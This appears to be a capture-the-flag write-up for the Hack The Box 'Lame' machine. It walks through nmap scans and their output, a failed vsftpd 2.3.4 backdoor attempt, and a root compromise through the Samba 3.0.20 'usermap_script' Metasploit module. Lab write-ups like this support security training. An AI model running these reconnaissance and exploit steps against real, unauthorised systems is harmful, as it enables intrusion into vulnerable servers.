# Summary
## 1. NMAP Scan
Typical NMAP scan, reveals `vsFTPd v2.3.4` on Port 21.

## 2. First Attack on FTP
Tried with metasploit modules, did not work.

## 3. Finding another attack vector
We do more NMAP scans and find `netbios-ssn Samba smbd 3.0.20-Debian`.

## 4. Second attack on Port 445 Samba
SearchSploit reveals it is susceptible to a `Username map script Command Execution` Metasploit module.
We run it and is able to compromise the system.

# Attack
## 1. NMAP Scan
`nmap -sC -v 10.10.10.3 -Pn`

## 2. First Attack on FTP
Shows Port 21 FTP Login allowed amongst other opened ports.

`nc 10.10.10.3 21` shows `vsFTPd v2.3.4`.
`searchsploit vsftpd 2.3.4` shows `Backdoor Command Execution`.
However, metasploit attacks etc didn't work.

Sources:
- https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable/
- https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
- https://metalkey.github.io/vsftpd-v234-backdoor-command-execution.html

## 3. Finding another attack vector
Our first NMAP scan was useless. Let's try more nmap scans!

`nmap --script nmap-vulners -sV 10.10.10.3 -Pn -v` but didn't turn out to be useful. (Source: https://securitytrails.com/blog/nmap-vulnerability-scan).

Let's try something else which turned out to be more useful.
`nmap -sC -sV -A -v 10.10.10.3 -Pn`
```
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h30m18s, deviation: 3h32m07s, median: 18s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2020-11-26T07:45:56-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

```

## 4. Second attack on Port 445 Samba
Shows Samba smbd 3.0.20-Debian.
`searchsploit samba 3.0.20`.
```
hippoeug@kali:~$ searchsploit samba 3.0.20
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                      |  Path
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                              | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                    | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                                                                                               | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                                       | linux_x86/dos/36741.py
------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

There are a few interesting choices, but we are going for `Username map script Command Execution` Metasploit module.
Researching it, we find https://securitytrails.com/blog/nmap-vulnerability-scan.
Let's run the metasploit script `use exploit/multi/samba/usermap_script`.

Boom, we got root access and found the flags!
